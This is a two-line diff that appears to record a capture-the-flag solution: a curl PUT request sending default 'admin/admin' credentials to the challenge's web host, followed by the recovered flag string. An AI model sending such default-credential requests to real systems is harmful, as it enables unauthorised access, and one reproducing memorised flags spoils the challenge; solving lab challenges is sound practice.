@@ -1,0 +1,2 @@
+curl -X PUT https://incognito-web.herokuapp.com/ --data "user=admin&pass=admin"
+	ICTF{N0T_S0_S3Cur3d_853541}
